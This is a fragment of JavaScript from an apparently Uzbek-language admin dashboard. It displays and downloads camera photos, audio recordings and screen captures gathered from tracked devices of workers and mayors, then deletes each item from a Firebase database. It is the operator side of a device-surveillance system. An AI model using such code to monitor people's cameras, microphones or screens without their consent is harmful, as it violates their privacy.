        <img src="data:image/jpeg;base64,${cur.screen_base64}" style="max-height: 240px; width: 100%; object-fit: contain;">
      ` : `<span style="color: #64748B; font-size: 11px;">Tasvir yo'q</span>`)}
    </div>
    <div style="display: flex; justify-content: space-between; align-items: center;">
      <div style="display: flex; gap: 6px;">
        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminPrevScreen()" ${idx === 0 ? 'disabled' : ''}>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg> Oldingi
        </button>
        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 12px; display: inline-flex; align-items: center; gap: 4px;" onclick="adminNextScreen()" ${idx === screens.length - 1 ? 'disabled' : ''}>
          Keyingi <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
        </button>
      </div>
      <button class="btn btn-primary" style="padding: 4px 12px; font-size: 12px; background: #7C3AED; border-color: #7C3AED; color: white; display: inline-flex; align-items: center; gap: 4px;" onclick="adminDownloadScreen(${idx})">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>Yuklab Olish
      </button>
    </div>
  `;
}

function adminPrevScreen() {
  if (adminDeviceData.currentScreenIdx > 0) {
    adminDeviceData.currentScreenIdx--;
    renderAdminScreenCapture();
  }
}

function adminNextScreen() {
  if (adminDeviceData.currentScreenIdx < adminDeviceData.screens.length - 1) {
    adminDeviceData.currentScreenIdx++;
    renderAdminScreenCapture();
  }
}

function downloadBase64File(base64Data, fileName, mimeType) {
  try {
    const link = document.createElement('a');
    link.href = `data:${mimeType};base64,${base64Data}`;
    link.download = fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    return true;
  } catch (e) {
    console.error('Download error:', e);
    return false;
  }
}

function adminDownloadPhoto(idx) {
  const cur = adminDeviceData.photos[idx];
  if (!cur) return;
  const ts = cur.timestamp || Date.now();
  let downloaded = false;
  if (cur.back_base64) {
    downloadBase64File(cur.back_base64, `Photo_Back_${ts}.jpg`, 'image/jpeg');
    downloaded = true;
  }
  if (cur.front_base64) {
    downloadBase64File(cur.front_base64, `Photo_Front_${ts}.jpg`, 'image/jpeg');
    downloaded = true;
  }
  if (downloaded && cur._key && adminSelectedUsername) {
    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_photos/${cur._key}`).remove()
      .then(() => {
        showToast("Rasm saqlandi va bazadan o'chirildi!");
      })
      .catch(err => {
        console.error(err);
        showToast("Rasm saqlandi, lekin bazadan o'chirishda xatolik bo'ldi.");
      });
  }
}

function adminDownloadAudio(idx) {
  const cur = adminDeviceData.audios[idx];
  if (!cur || !cur.audio_base64) return;
  const ts = cur.timestamp || Date.now();
  downloadBase64File(cur.audio_base64, `Audio_${ts}.m4a`, 'audio/mp4');
  if (cur._key && adminSelectedUsername) {
    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_audio/${cur._key}`).remove()
      .then(() => {
        showToast("Ovoz yozuvi yuklandi va bazadan o'chirildi!");
      })
      .catch(err => {
        console.error(err);
        showToast("Ovoz yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
      });
  }
}

function adminDownloadScreen(idx) {
  const cur = adminDeviceData.screens[idx];
  if (!cur) return;
  const ts = cur.timestamp || Date.now();
  let downloaded = false;
  if (cur.video_base64) {
    downloadBase64File(cur.video_base64, `Screen_Video_${ts}.mp4`, 'video/mp4');
    downloaded = true;
  } else if (cur.screen_base64) {
    downloadBase64File(cur.screen_base64, `Screen_Capture_${ts}.jpg`, 'image/jpeg');
    downloaded = true;
  }
  if (downloaded && cur._key && adminSelectedUsername) {
    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/media/archive_screen/${cur._key}`).remove()
      .then(() => {
        showToast("Ekran yozuvi yuklandi va bazadan o'chirildi!");
      })
      .catch(err => {
        console.error(err);
        showToast("Ekran yozuvi yuklandi, lekin bazadan o'chirishda xatolik bo'ldi.");
      });
  }
}

window.adminPrevPhoto = adminPrevPhoto;
window.adminNextPhoto = adminNextPhoto;
window.adminPrevAudio = adminPrevAudio;
window.adminNextAudio = adminNextAudio;
window.adminPrevScreen = adminPrevScreen;
window.adminNextScreen = adminNextScreen;
window.adminDownloadPhoto = adminDownloadPhoto;
window.adminDownloadAudio = adminDownloadAudio;
window.adminDownloadScreen = adminDownloadScreen;

// React to global store user changes
window.onStoreChange('users', () => {
  if (window.store.currentUser && window.store.currentUser.role === 'BIG_ADMIN') {
    const trackable = (window.store.users || []).filter(u => u.role === 'WORKER' || u.role === 'MAYOR');
    if (!adminSelectedUsername && trackable.length > 0) {
      adminSelectedUsername = trackable[0].username;
      attachAdminDeviceListeners(adminSelectedUsername);
    }
    renderAdminView();
  }
});
